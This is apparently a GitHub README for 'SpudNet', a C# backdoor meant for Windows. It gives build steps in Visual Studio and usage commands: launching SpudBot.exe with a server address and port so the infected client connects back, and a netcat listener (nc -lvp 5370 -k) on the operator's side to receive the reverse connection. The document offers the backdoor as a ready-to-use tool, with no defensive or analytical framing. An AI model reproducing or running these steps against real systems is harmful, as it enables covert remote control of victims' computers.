# SpudNet
---
## Description
A Potato-themed backdoor developed in C#. 

![SpudNet](screenshots/spudnet.png)

## Requirements
- .NET Framework ≥ 4.7
- A Windows client running SpudBot.exe.
- A server listening for incomming connections. 

## Installation
- Download a copy of the Github repo.
- Open **SpudBot.Sln** within Visual Studio.
- Build the solution within Visual Studio. 

## Usage
On the client, launch **SpudBot.exe** with Command-line arguments pointing to the server you would like to connect too. 
```
SpudBot.exe "Server" "Port"
```
On the server, setup a listener to watch for inbound connections.
```
nc -lvp 5370 -k
```
---
